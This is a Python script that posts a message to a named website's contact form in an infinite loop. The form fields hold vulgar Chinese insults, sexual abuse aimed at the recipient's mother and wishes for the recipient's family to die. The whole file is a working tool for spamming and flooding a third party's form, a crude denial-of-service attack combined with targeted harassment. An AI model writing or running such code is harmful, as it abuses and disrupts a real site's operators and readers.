import requests

import requests
import json
import _thread

url = 'http://wellin123.cndns.tw/index.php?_m=new_message_form&_a=savemes'
body = {"msid": 44, "mes[text-i1]": "你个垃圾东西操死你妈", "mes[mobile-i2]": 44444444444,"mes[text-i3]": 444444444, "mes[text-i4]": '你全家死光了吧你女人被我操烂了'}
headers = {'content-type': "application/x-www-form-urlencoded"}

# print type(body)
# print type(json.dumps(body))
# 这里有个细节，如果body需要json形式的话，需要做处理
# 可以是data = json.dumps(body)
if True:
    response = requests.post(url, data=body, headers=headers)
    # 也可以直接将data字段换成json字段，2.4.3版本之后支持
    # response  = requests.post(url, json = body, headers = headers)

    # 返回信息
    print(response.text)

    # 返回响应头
    print(response.status_code)

def loop(init):
    now = init
    while 1:
        yield now
        now+=1
for i in loop(0):
    response = requests.post(url, data=body, headers=headers)
    # 也可以直接将data字段换成json字段，2.4.3版本之后支持
    # response  = requests.post(url, json = body, headers = headers)

    # 返回信息
    print(response.text)

    # 返回响应头
    print(response.status_code)
 